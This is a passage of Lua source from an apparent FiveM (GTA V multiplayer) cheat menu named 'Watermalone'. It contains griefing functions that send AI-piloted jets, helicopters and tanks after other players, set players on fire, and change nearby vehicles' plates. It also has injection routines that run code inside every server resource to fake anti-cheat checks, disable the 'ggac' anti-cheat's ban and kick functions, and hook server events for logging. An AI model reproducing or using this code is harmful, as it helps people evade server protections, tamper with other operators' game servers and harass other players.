                        wmlua.N.SetEntityRotation(wmlua.V._ATTACKPLANE, wmlua.V._ATTACKPLANEROT)
                        wmlua.F.RequestControl(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleJetEngineOn(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleForceAfterburner(wmlua.V._ATTACKPLANE, true)
                        wmlua.N.SetPlaneTurbulenceMultiplier(wmlua.V._ATTACKPLANE, 0.0)
                        wmlua.N.SetHeliBladesFullSpeed(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleModKit(wmlua.V._ATTACKPLANE, 0)
                        wmlua.N.SetVehicleMod(wmlua.V._ATTACKPLANE, 9, 1, false)
                        wmlua.N.ControlLandingGear(wmlua.V._ATTACKPLANE, 3)
                        wmlua.N.SetPedRelationshipGroupHash(wmlua.V._ATTACKPLANEPILOT, wmlua.N.GetHashKey("security_guard"))
                        wmlua.N.TaskPlaneMission(wmlua.V._ATTACKPLANEPILOT, wmlua.V._ATTACKPLANE, wmlua.N.GetVehiclePedIsIn(wmlua.V.TargetPed, false), wmlua.V.TargetPed, wmlua.N.GetEntityPos(wmlua.V.TargetPed), 6, 1, 0, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), 2700.0, 0.0)
                        wmlua.N.SetPedCombatRange(wmlua.V._ATTACKPLANEPILOT, 9999999.0)
                        wmlua.N.SetPedCombatAbility(wmlua.V._ATTACKPLANEPILOT, 2)
                        wmlua.N.SetDriverAbility(wmlua.V._ATTACKPLANEPILOT, 1.0)
                        wmlua.F.MaxVehUpgrade(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleForwardSpeed(wmlua.V._ATTACKPLANE, 50.0)
                        wmlua_Schleep(1000)
                    end
    
                end)
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            if wmlua.V.target ~= -69 then
    
                wmlua.V.TargetPed = wmlua.N.GetPlayerPed(wmlua.V.target)
                wmlua.V._bx,wmlua.V._by,wmlua.V._bz = table.unpack(wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.V.TargetPed, 0.0, 0.0, 1400.0))
                wmlua.V._ATTACKPLANE = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("strikeforce"), wmlua.V._bx, wmlua.V._by, wmlua.V._bz, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), true, true)
                wmlua.V._ATTACKPLANEPILOT = wmlua.N.CreatePedInsideVehicle(wmlua.V._ATTACKPLANE, 29, wmlua.N.GetHashKey("s_m_y_pilot_01"), -1, true, true)
                wmlua.V._ATTACKPLANEROT = wmlua.N.GetEntityRotation(wmlua.V._ATTACKPLANE,2)
    
                wmlua_Thread(function()
                    for i = 1, 5 do
                        wmlua.N.SetEntityRotation(wmlua.V._ATTACKPLANE, wmlua.V._ATTACKPLANEROT)
                        wmlua.F.RequestControl(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleJetEngineOn(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleForceAfterburner(wmlua.V._ATTACKPLANE, true)
                        wmlua.N.SetPlaneTurbulenceMultiplier(wmlua.V._ATTACKPLANE, 0.0)
                        wmlua.N.SetHeliBladesFullSpeed(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleModKit(wmlua.V._ATTACKPLANE, 0)
                        wmlua.N.SetVehicleMod(wmlua.V._ATTACKPLANE, 9, 1, false)
                        wmlua.N.ControlLandingGear(wmlua.V._ATTACKPLANE, 3)
                        wmlua.N.SetPedRelationshipGroupHash(wmlua.V._ATTACKPLANEPILOT, wmlua.N.GetHashKey("security_guard"))
                        wmlua.N.TaskPlaneMission(wmlua.V._ATTACKPLANEPILOT, wmlua.V._ATTACKPLANE, wmlua.N.GetVehiclePedIsIn(wmlua.V.TargetPed, false), wmlua.V.TargetPed, wmlua.N.GetEntityPos(wmlua.V.TargetPed), 6, 1, 0, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), 2700.0, 0.0)
                        wmlua.N.SetPedCombatRange(wmlua.V._ATTACKPLANEPILOT, 9999999.0)
                        wmlua.N.SetPedCombatAbility(wmlua.V._ATTACKPLANEPILOT, 2)
                        wmlua.N.SetDriverAbility(wmlua.V._ATTACKPLANEPILOT, 1.0)
                        wmlua.F.MaxVehUpgrade(wmlua.V._ATTACKPLANE)
                        wmlua.N.SetVehicleForwardSpeed(wmlua.V._ATTACKPLANE, 50.0)
                        wmlua_Schleep(1000)
                    end
    
                end)
    
                wmlua.F.EventLogInsert("[~b~WM~w~] Plane targeting " .. wmlua.N.GetPlayerName(wmlua.V.target), 3000)
    
            else
    
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
    
            end
        end

    end

    function wmlua.F.MALAttackHeli(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.TargetPed = wmlua.N.GetPlayerPed(wmlua.V.target)
                wmlua.V._bx,wmlua.V._by,wmlua.V._bz = table.unpack(wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.V.TargetPed, 0.0, 0.0, 800.0))
                wmlua.V._ATTACKHELI = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("savage"), wmlua.V._bx, wmlua.V._by, wmlua.V._bz, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), true, true)
                wmlua.V._ATTACKHELIPILOT = wmlua.N.CreatePedInsideVehicle(wmlua.V._ATTACKHELI, 29, wmlua.N.GetHashKey("s_m_y_pilot_01"), -1, true, true)
                wmlua.V._ATTACKHELIROT = wmlua.N.GetEntityRotation(wmlua.V._ATTACKHELI,2)
                wmlua.V._ATTACKHELIPOS = wmlua.N.GetEntityPos(wmlua.V._ATTACKHELI)

                wmlua_Thread(function()
                    for i = 1, 5 do
                        wmlua.F.RequestControl(wmlua.V._ATTACKHELI)
                        wmlua.N.SetEntityRotation(wmlua.V._ATTACKHELI, wmlua.V._ATTACKHELIROT)
                        wmlua.N.SetHeliBladesFullSpeed(wmlua.V._ATTACKHELI)
                        wmlua.N.SetVehicleForwardSpeed(wmlua.V._ATTACKHELI, 15.0)
                        TaskHeliMission(wmlua.V._ATTACKHELIPILOT, wmlua.V._ATTACKHELI, wmlua.N.GetVehiclePedIsIn(wmlua.V.TargetPed, false), wmlua.V.TargetPed, wmlua.N.GetEntityPos(wmlua.V.TargetPed), 6, 336.0, 0, -1, -1, 32)
                        wmlua.N.SetPedCombatRange(wmlua.V._ATTACKHELIPILOT, 9999999.0)
                        wmlua.N.SetPedCombatAbility(wmlua.V._ATTACKHELIPILOT, 2)
                        wmlua.N.SetDriverAbility(wmlua.V._ATTACKHELIPILOT, 1.0)
                        wmlua.F.MaxVehUpgrade(wmlua.V._ATTACKHELI)
                        wmlua_Schleep(1000)
                    end
                end)
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            if wmlua.V.target ~= -69 then
    
                wmlua.V.TargetPed = wmlua.N.GetPlayerPed(wmlua.V.target)
                wmlua.V._bx,wmlua.V._by,wmlua.V._bz = table.unpack(wmlua.N.GetOffsetFromEntityInWorldCoords(wmlua.V.TargetPed, 0.0, 0.0, 800.0))
                wmlua.V._ATTACKHELI = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("savage"), wmlua.V._bx, wmlua.V._by, wmlua.V._bz, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), true, true)
                wmlua.V._ATTACKHELIPILOT = wmlua.N.CreatePedInsideVehicle(wmlua.V._ATTACKHELI, 29, wmlua.N.GetHashKey("s_m_y_pilot_01"), -1, true, true)
                wmlua.V._ATTACKHELIROT = wmlua.N.GetEntityRotation(wmlua.V._ATTACKHELI,2)
                wmlua.V._ATTACKHELIPOS = wmlua.N.GetEntityPos(wmlua.V._ATTACKHELI)
    
                wmlua_Thread(function()
                    for i = 1, 5 do
                        wmlua.F.RequestControl(wmlua.V._ATTACKHELI)
                        wmlua.N.SetEntityRotation(wmlua.V._ATTACKHELI, wmlua.V._ATTACKHELIROT)
                        wmlua.N.SetHeliBladesFullSpeed(wmlua.V._ATTACKHELI)
                        wmlua.N.SetVehicleForwardSpeed(wmlua.V._ATTACKHELI, 15.0)
                        TaskHeliMission(wmlua.V._ATTACKHELIPILOT, wmlua.V._ATTACKHELI, wmlua.N.GetVehiclePedIsIn(wmlua.V.TargetPed, false), wmlua.V.TargetPed, wmlua.N.GetEntityPos(wmlua.V.TargetPed), 6, 336.0, 0, -1, -1, 32)
                        wmlua.N.SetPedCombatRange(wmlua.V._ATTACKHELIPILOT, 9999999.0)
                        wmlua.N.SetPedCombatAbility(wmlua.V._ATTACKHELIPILOT, 2)
                        wmlua.N.SetDriverAbility(wmlua.V._ATTACKHELIPILOT, 1.0)
                        wmlua.F.MaxVehUpgrade(wmlua.V._ATTACKHELI)
                        wmlua_Schleep(1000)
                    end
                end)
    
                wmlua.F.EventLogInsert("[~b~WM~w~] Heli targeting " .. wmlua.N.GetPlayerName(wmlua.V.target), 3000)
    
            else
    
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
    
            end
        end

    end

    function wmlua.F.MALAttackTank(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.TargetPed = wmlua.N.GetPlayerPed(wmlua.V.target)
                _bx,_by,_bz = table.unpack(wmlua.N.GetEntityPos(wmlua.V.TargetPed))
                _,wmlua.V.pos = GetClosestVehicleNode(_bx, _by, _bz, 1, 0)
                wmlua.V._ATTACKTANK = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("rhino"), wmlua.V.pos, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), true, true)
                wmlua.V._ATTACKTANKPILOT = wmlua.N.CreatePedInsideVehicle(wmlua.V._ATTACKTANK, 29, wmlua.N.GetHashKey("s_m_y_marine_01"), -1, true, true)
    
                wmlua_Thread(function()
                    for i = 1, 5 do
                        wmlua.F.RequestControl(wmlua.V._ATTACKTANK)
                        if wmlua.N.IsPedInAVehicle(wmlua.V.TargetPed) then
                            TaskVehicleChase(wmlua.V._ATTACKTANKPILOT, wmlua.V.TargetPed) -- this actually has it fire as well, not just chase lol problem is target requires being inside of a vehicle initially, doesnt matter if they get out after -.- stupid native lol
                        else
                            SetVehicleShootAtTarget(wmlua.V._ATTACKTANKPILOT, wmlua.V.TargetPed, wmlua.N.GetEntityPos(wmlua.V.TargetPed))
                        end
                        SetPedKeepTask(wmlua.V._ATTACKTANKPILOT, true)
                        wmlua.N.SetPedCombatRange(wmlua.V._ATTACKTANKPILOT, 9999999.0)
                        wmlua.N.SetPedCombatAbility(wmlua.V._ATTACKTANKPILOT, 2)
                        wmlua.N.SetDriverAbility(wmlua.V._ATTACKTANKPILOT, 1.0)
                        wmlua.F.MaxVehUpgrade(wmlua.V._ATTACKTANK)
                        wmlua_Schleep(1000)
                    end
                end)
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id")
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            if wmlua.V.target ~= -69 then
    
                wmlua.V.TargetPed = wmlua.N.GetPlayerPed(wmlua.V.target)
                _bx,_by,_bz = table.unpack(wmlua.N.GetEntityPos(wmlua.V.TargetPed))
                _,wmlua.V.pos = GetClosestVehicleNode(_bx, _by, _bz, 1, 0)
                wmlua.V._ATTACKTANK = wmlua.N.SpawnVeh(wmlua.N.GetHashKey("rhino"), wmlua.V.pos, wmlua.N.GetEntityHeading(wmlua.V.TargetPed), true, true)
                wmlua.V._ATTACKTANKPILOT = wmlua.N.CreatePedInsideVehicle(wmlua.V._ATTACKTANK, 29, wmlua.N.GetHashKey("s_m_y_marine_01"), -1, true, true)
    
                wmlua_Thread(function()
                    for i = 1, 5 do
                        wmlua.F.RequestControl(wmlua.V._ATTACKTANK)
                        if wmlua.N.IsPedInAVehicle(wmlua.V.TargetPed) then
                            TaskVehicleChase(wmlua.V._ATTACKTANKPILOT, wmlua.V.TargetPed) -- this actually has it fire as well, not just chase lol problem is target requires being inside of a vehicle initially, doesnt matter if they get out after -.- stupid native lol
                        else
                            SetVehicleShootAtTarget(wmlua.V._ATTACKTANKPILOT, wmlua.V.TargetPed, wmlua.N.GetEntityPos(wmlua.V.TargetPed))
                        end
                        SetPedKeepTask(wmlua.V._ATTACKTANKPILOT, true)
                        wmlua.N.SetPedCombatRange(wmlua.V._ATTACKTANKPILOT, 9999999.0)
                        wmlua.N.SetPedCombatAbility(wmlua.V._ATTACKTANKPILOT, 2)
                        wmlua.N.SetDriverAbility(wmlua.V._ATTACKTANKPILOT, 1.0)
                        wmlua.F.MaxVehUpgrade(wmlua.V._ATTACKTANK)
                        wmlua_Schleep(1000)
                    end
                end)
                wmlua.F.EventLogInsert("[~b~WM~w~] Tank targeting " .. wmlua.N.GetPlayerName(wmlua.V.target), 3000)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.MALSetOnFire(_asid)

        wmlua.V.Hash_campfire = wmlua.N.GetHashKey("prop_beach_fire")
        if _asid then
            for i = 1, #_asid do
                wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                wmlua.V._target = _asid
                wmlua_Thread(function()
                    wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(wmlua.V.target), true)
                    wmlua.V.fireobj = wmlua.N.SpawnObj(wmlua.V.Hash_campfire, 0.0, 0.0, 0.0, true, false, true)
                    wmlua.N.AttachEntityToEntity(wmlua.V.fireobj, wmlua.N.GetPlayerPed(wmlua.V.target), 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                    wmlua.F.InsertToTable(wmlua.T.Fires, {entity = wmlua.V.fireobj, sid = wmlua.V._target})
                end)
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id or all")
            wmlua.V._target = wmlua.V.target
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
            if string.lower(wmlua.V.target) == "all" then
                for i, v in ipairs(wmlua.Playerlist_Players) do
                    wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(v.ped), true)
                    wmlua.V.fireobj = wmlua.N.SpawnObj(wmlua.V.Hash_campfire, 0.0, 0.0, 0.0, true, false, true)
                    wmlua.N.AttachEntityToEntity(wmlua.V.fireobj, v.ped, 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                    wmlua.F.InsertToTable(wmlua.T.Fires, {entity = wmlua.V.fireobj, sid = v.pid})
                end
            elseif wmlua.V.target ~= -69 then
                wmlua_Thread(function()
                    wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(wmlua.V.target), true)
                    wmlua.V.fireobj = wmlua.N.SpawnObj(wmlua.V.Hash_campfire, 0.0, 0.0, 0.0, true, false, true)
                    wmlua.N.AttachEntityToEntity(wmlua.V.fireobj, wmlua.N.GetPlayerPed(wmlua.V.target), 0.0, 0.0,0.0,-0.9,0.0,0.0,0.0, false, false, true, true, 0, 1)
                    wmlua.F.InsertToTable(wmlua.T.Fires, {entity = wmlua.V.fireobj, sid = wmlua.V._target})
                end)
            else
                wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)
            end
        end

    end

    function wmlua.F.MALPutOutFire(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua_Thread(function()
                    wmlua.V.target = wmlua.F.SIDToPID(_asid[i])
                    wmlua.V._target = _asid
                    for k,v in ipairs(wmlua.T.Fires) do
                        if tonumber(v.sid) == tonumber(wmlua.V._target) then -- Ooga booga, these should be numbers but just to make sure
                            for i = 1, 10 do
                                wmlua.F.RequestControl(v.entity)
                                wmlua.N.DeleteEntity(v.entity)
                            end
                        end
                    end
                end)
            end
        else
            wmlua.V.target = wmlua.F.GetInput("Enter Player Server Id or all")
            wmlua.V._target = wmlua.V.target
            if string.lower(wmlua.V.target) ~= "all" then wmlua.V.target = wmlua.F.SIDToPID(wmlua.V.target) end
        end

        if string.lower(wmlua.V.target) == "all" then

            for k,v in ipairs(wmlua.T.Fires) do
                for i = 1, 10 do
                    wmlua.F.RequestControl(v.entity)
                    wmlua.N.DeleteEntity(v.entity)
                end
            end

        elseif wmlua.V.target ~= -69 then

            wmlua_Thread(function()

                for k,v in ipairs(wmlua.T.Fires) do
                    if tonumber(v.sid) == tonumber(wmlua.V._target) then -- Ooga booga, these should be numbers but just to make sure
                        for i = 1, 10 do
                            wmlua.F.RequestControl(v.entity)
                            wmlua.N.DeleteEntity(v.entity)
                        end
                    end
                end

            end)

        else

            wmlua.F.EventLogInsert("[~b~WM~w~] Player not found", 3000)

        end

    end

    function wmlua.F.PLYRevive()

        wmlua.N.ResurrectPed(wmlua.N.GetPlayerPed())
        wmlua.N.SetEntityHealth(wmlua.N.GetPlayerPed(), GetPedMaxHealth(wmlua.N.GetPlayerPed()))
        wmlua.N.Clear_PedTasks(wmlua.N.GetPlayerPed(), true)
        wmlua.N.ClearPedBloodDamage(wmlua.N.GetPlayerPed())

    end

    function wmlua.F.PLYFakeDead()

        wmlua.F.CFS("wmlua.V.Ply_fakedead")

        if wmlua.V.Ply_fakedead then
            SetEntityMaxHealth(wmlua.N.GetPlayerPed(), 0)
        else
            SetEntityMaxHealth(wmlua.N.GetPlayerPed(), 200)
        end

    end

    function wmlua.F.PLYAntiStun()

        wmlua.F.CFS("wmlua.V.Ply_antistun")

    end

    function wmlua.F.PLYAntiragdoll()

        wmlua.F.CFS("wmlua.V.Ply_antiragdoll")

    end    

    function wmlua.F.PLYInfStamina()

        wmlua.F.CFS("wmlua.V.Ply_infstamina")

    end

    function wmlua.F.VEHEngineAlwaysOn()

        wmlua.F.CFS("wmlua.V.Veh_enginealwayson")

    end

    function wmlua.F.VEHAnimatedPlate()

        wmlua.F.CFS("wmlua.V.Veh_animatedplate")

    end

    function wmlua.F.VEHInfFuel()

        wmlua.F.CFS("wmlua.V.Veh_inffuel")

    end

    function wmlua.F.VEHAlwaysWheelie()

        wmlua.F.CFS("wmlua.V.Veh_alwayswheelie")

    end

    function wmlua.F.VEHNearbyPlates()

        local plateInput = wmlua.F.GetInput("Enter Plate Text (8 Characters)")

        local vehList = wmlua.N.GetEntList("CVehicle")
        for i = 1, #vehList do
            wmlua.F.RequestControl(vehList[i])
            wmlua.N.SetVehicleNumberPlateText(vehList[i], plateInput)
        end

    end

    function wmlua.F.LUASetEntityQueue()

        wmlua.V.elq1 = tonumber(wmlua.F.GetInput('Enter queue time in miliseconds'))
        if type(wmlua.V.elq1) == "number" then
            wmlua.V.elq = wmlua.V.elq1
            wmlua.F.EventLogInsert("[~g~WM~w~] Set queue time to: " .. wmlua.V.elq .. "ms")
        else
            wmlua.F.EventLogInsert("[~r~WM~w~] Invalid Input")
        end

    end

    function wmlua.F.LUADerestrict()

        local srv = [[
            
            local preventMolest = '.i = "Watermalone"'

            local ts = tostring
            local yepCock = _HAM_
            function tostring(p1)
                if ts(p1) == ts(yepCock) or ts(p1) == "3607903178" or ts(p1) == "-6886964137647574376" then
                    return "3348473001"
                else
                    return ts(p1)
                end
            end

            local wmlua = {}
            wmlua.H = Citizen.InvokeNative(_HAM_)

            if _wminvoke == nil then
                local _wminvoke = Citizen.InvokeNative
                function Citizen.InvokeNative(native, ...)
                    local invokeInterfere = {
                        {name = "Selected Wep Check", hash = 0x0A6DB4965674D243, hashstr = '0x0A6DB4965674D243', rtype = GetHashKey("weapon_unarmed")},
                        {name = "Is Falling Check", hash = 0xFB92A102F1C4DFA3, hashstr = '0xFB92A102F1C4DFA3', rtype = false},
                        {name = "Spectator Check", hash = 0x048746E388762E11, hashstr = '0x048746E388762E11', rtype = false},
                        --{name = "Get Cur Wep Check", hash = 0x3A87E44BB9A01D54, hashstr = '0x3A87E44BB9A01D54', rtype = false},
                        {name = "Has wep check", hash = 0x8DECB02F88F428BC, hashstr = '0x8DECB02F88F428BC', rtype = false},
                        {name = "Get Blip", hash = 0xBC8DBDCA2436F7E8, hashstr = '0xBC8DBDCA2436F7E8', rtype = 0},
                        {name = "Remove Weapon", hash = 0x4899CB088EDF59B8, hashstr = '0x4899CB088EDF59B8', rtype = nil}
                    }
                    if type(initArg) == "string" then
                        initArg = initArg:gsub('%s*', '')
                    end
                    for k2,v2 in ipairs(invokeInterfere) do
                        if initArg == v2.hashstr or initArg == v2.hash then
                            return v2.rtype
                        end
                    end
                    return _wminvoke(native, ...)
                end
            end

            local sprintOriginal = GetPlayerSprintStaminaRemaining(wmlua.H.WMInvokeNative(0x4F8644AF03D0E0D6))
            function GetPlayerSprintStaminaRemaining(...)
                return sprintOriginal
            end

            local StatIntStr_B, StatIntStr_V = wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, GetHashKey("MP0_STRENGTH"), wmlua.H.PointerValueInt(), -1, wmlua.H.ReturnResultAnyway())
            local StatIntWhl_B, StatIntWhl_V = wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, GetHashKey("MP0_WHEELIE_ABILITY"), wmlua.H.PointerValueInt(), -1, wmlua.H.ReturnResultAnyway())
            local StatIntDrv_B, StatIntDrv_V = wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, GetHashKey("MP0_DRIVING_ABILITY"), wmlua.H.PointerValueInt(), -1, wmlua.H.ReturnResultAnyway())
            local StatIntFly_B, StatIntFly_V = wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, GetHashKey("MP0_FLYING_ABILITY"), wmlua.H.PointerValueInt(), -1, wmlua.H.ReturnResultAnyway())
            local StatIntSht_B, StatIntSht_V = wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, GetHashKey("MP0_SHOOTING_ABILITY"), wmlua.H.PointerValueInt(), -1, wmlua.H.ReturnResultAnyway())
            local StatIntSte_B, StatIntSte_V = wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, GetHashKey("MP0_STEALTH_ABILITY"), wmlua.H.PointerValueInt(), -1, wmlua.H.ReturnResultAnyway())

            function StatGetInt(p1)

                if p1 == GetHashKey("MP0_STRENGTH") then
                    return StatIntStr_B, StatIntStr_V
                elseif p1 == GetHashKey("MP0_WHEELIE_ABILITY") then
                    return StatIntWhl_B, StatIntWhl_V
                elseif p1 == GetHashKey("MP0_DRIVING_ABILITY") then
                    return StatIntDrv_B, StatIntDrv_V
                elseif p1 == GetHashKey("MP0_FLYING_ABILITY") then
                    return StatIntFly_B, StatIntFly_V
                elseif p1 == GetHashKey("MP0_SHOOTING_ABILITY") then
                    return StatIntSht_B, StatIntSht_V
                elseif p1 == GetHashKey("MP0_STEALTH_ABILITY") then
                    return StatIntSte_B, StatIntSte_V
                else
                    return wmlua.H.WMInvokeNative(0x767FBC2AC802EF3D, p1, -1)
                end

            end

            function ClearPedTasks(...)
            end

            function ClearPedTasksImmediately(...)
            end

            function GetSelectedPedWeapon(...)
                return GetHashKey("weapon_unarmed")
            end

            function IsPedFalling(...)
                return true
            end

            function IsPedJumping()
                return false
            end

            function NetworkIsInSpectatorMode()
                return false
            end
            
            function GetCurrentPedWeapon(...)
                return false, GetHashKey("weapon_unarmed")
            end

            function HasPedGotWeapon(...)
                return false
            end

            function GetBlipFromEntity(...)
                return 0
            end

            function DisableControlAction(...)
            end

            function DisableAllControlActions(...)
            end

            function RemoveWeaponFromPed(...)
            end

            function IsEntityVisible(...)
            end

            function EnableControlAction(...)
            end

            function EnableAllControlActions(...)
            end

            function collectgarbage(...) -- prevent some stuttering KEK
            end
            
            if CheckWeaPon then
                function CheckWeaPon(...)
                end
            end

        ]]

        if wmlua.B.wmExecAt and wmlua.V.Lua_derestrict ~= true then
            wmlua_Thread(function()
                wmlua.F.EventLogInsert('[~b~WM~w~] Derestrict activated', 10000)
                wmlua.V.Lua_derestrict = true
                local rc = wmlua.N.GetNumResources() - 1
                for i = 0, rc do
                    rn = wmlua.N.GetResourceByFindIndex(i)
                    wmlua.B.wmExecAt(rn, srv)
                end
            end)
        end

    end

    function wmlua.F.LUABypassGGAC()

        local srv = [[

            local preventMolest = '.i = "Watermalone"'
            local wmlua = {}
            wmlua.H = Citizen.InvokeNative(_HAM_)

            if Config then
                Config.AfkLimit = 9999999 * 60000
            end

            local cock = GetGameTimer()
            function GetGameTimer()
                return cock
            end

            function GetUsingnightvision()
                return false
            end
            function GetUsingseethrough()
                return false
            end

            function BanMe()
            end
            function DropMe()
            end

        ]]

        if wmlua.B.wmExecAt and wmlua.V.Lua_bypassggac ~= true then
            if wmlua.T.ResourceDI["ggac"] then
                wmlua.V.Lua_bypassggac = true
                wmlua_Thread(function()
                    wmlua.F.EventLogInsert('[~b~WM~w~] El GGAC should be disabled', 10000)
                    wmlua.B.wmExecAt("ggac", srv)
                end)
            else
                wmlua.F.EventLogInsert('[~r~WM~w~] Resource not found')
            end
        end

    end

    function wmlua.F.LUALogTriggers()

        local srv = [[

            local ElHam = Citizen.InvokeNative(_HAM_)
            
            local preventMolest = '.i = "Watermalone"'
            local function wada_send_event(server, e, ...)
                local KEK = msgpack.pack({...})
                if server < 1 and e then
                    ElHam.InvokeNative(0x91310870, e, KEK, KEK:len())
                else
                    ElHam.InvokeNative(0x7FDD1128, e, KEK, KEK:len())
                end
            end

            local _t = TriggerServerEventInternal
            function TriggerServerEventInternal(event, ...)
                local rstr = ""
                local cock = {...}
                if #cock[1] == 1 then
                    rstr = event
                else
                    rstr = event .. " :: "
                end
                local depack = msgpack.unpack(...)
                for k,v in pairs(depack) do
                    if type(v) == "table" then
                        v = json.encode(v)
                    else
                        v = tostring(v)
                    end
                    if k ~= #depack then
                        rstr = rstr .. v .. " :: "
                    else
                        rstr = rstr .. v
                    end
                end
                _t(event, ...)
                wada_send_event(0, ']]..wmlua.API.wmEventLogger..[[', '[~y~FiveM~w~] ' .. ElHam.InvokeNative(0xE5E9EBBB, ElHam.ResultAsString()) .. ' > ' .. rstr)
            end

        ]]

        if wmlua.B.wmExecAt and wmlua.V.Lua_logserverevents ~= true then
            wmlua.F.EventLogInsert('[~b~WM~w~] Server Event Logger Activated', 6000)
            wmlua.V.Lua_logserverevents = true
            wmlua.V.LuaLSE = true
            local rc = wmlua.N.GetNumResources() - 1
            for i = 0, rc do
                rn = wmlua.N.GetResourceByFindIndex(i)
                wmlua.B.wmExecAt(rn, srv)
            end
        else
            wmlua.V.LuaLSE = not wmlua.V.LuaLSE
            if wmlua.V.LuaLSE then
                wmlua.F.EventLogInsert('[~b~WM~w~] Server Event Logging Enabled')
            else
                wmlua.F.EventLogInsert('[~b~WM~w~] Server Event Logging Disabled')
            end
        end

    end

    function wmlua.F.LUAHideTrigger()

        wmlua.V.TrigToHide = wmlua.F.GetInput("Enter part of the trigger")
        wmlua.F.InsertToTable(wmlua.T.EventsToHide, string.lower(wmlua.V.TrigToHide))
        wmlua.F.EventLogInsert('[~b~WM~w~] Added: ' .. wmlua.V.TrigToHide)

    end

    function wmlua.F.LUAShowTrigger()

        wmlua.V.TrigToShow = wmlua.F.GetInput("Enter part of the trigger or all")
        if string.lower(wmlua.V.TrigToShow) ~= "all" then
            local found = false
            for i = 1, #wmlua.T.EventsToHide do
                if wmlua.T.EventsToHide[i] == string.lower(wmlua.V.TrigToShow) then
                    found = true
                    wmlua.T.EventsToHide[i] = nil
                    wmlua.F.EventLogInsert("[~b~WM~w~] Removed")
                end
            end
            if found ~= true then
                wmlua.F.EventLogInsert("[~r~WM~w~] Not found")
            end
        else
            wmlua.T.EventsToHide = {}
        end

    end

    function wmlua.F.LUAMenuDebug()

        wmlua.F.CFS("wmlua.V.Lua_menudebug")

    end

    function wmlua.F.LUADrawSid()

        wmlua.F.CFS("wmlua.V.Lua_drawsid")

    end

    function wmlua.F.LUADrawControl()

        wmlua.F.CFS("wmlua.V.Lua_drawcontrol")

    end

    function wmlua.F.PLYAntiHeadshot()

        wmlua.F.CFS("wmlua.V.Ply_antiheadshot")

    end

    function wmlua.F.PLYGodmode()

        wmlua.F.CFS("wmlua.V.Ply_godmode")

    end

    function wmlua.F.PLYDemiGodmode()

        wmlua.F.CFS("wmlua.V.Ply_demigodmode")

    end

    function wmlua.F.MALObjectAttachSpamPlayer(_asid)

        if _asid then
            for i = 1, #_asid do
                wmlua.V.t = wmlua.F.SIDToPID(_asid[i])
                wmlua.V.tpos = wmlua.N.GetEntityPos(wmlua.N.GetPlayerPed(wmlua.V.t))
                
                wmlua.T.prplist = {
                    wmlua.N.GetHashKey("prop_a4_pile_01"), -- 1
                    wmlua.N.GetHashKey("prop_crashed_heli"), -- 2
                    wmlua.N.GetHashKey("prop_cockneon"), -- 3
                    wmlua.N.GetHashKey("prop_cooker_03"), -- 4
                    wmlua.N.GetHashKey("prop_crane_01_truck1"), -- 5
                    wmlua.N.GetHashKey("prop_crisp"), -- 6
                    wmlua.N.GetHashKey("prop_crosssaw_01"), -- 7
                    wmlua.N.GetHashKey("prop_creosote_b_01"), -- 8
                    wmlua.N.GetHashKey("prop_damdoor_01"), -- 9
                    wmlua.N.GetHashKey("prop_dart_1"), -- 10
                    wmlua.N.GetHashKey("prop_diggerbkt_01"), -- 11
                    wmlua.N.GetHashKey("prop_dj_deck_01"), -- 12
                    wmlua.N.GetHashKey("prop_distantcar_day"), -- 13
                    wmlua.N.GetHashKey("prop_distantcar_night"), -- 14
                    wmlua.N.GetHashKey("prop_distantcar_truck"), -- 15
                    wmlua.N.GetHashKey("prop_disp_razor_01"), -- 16
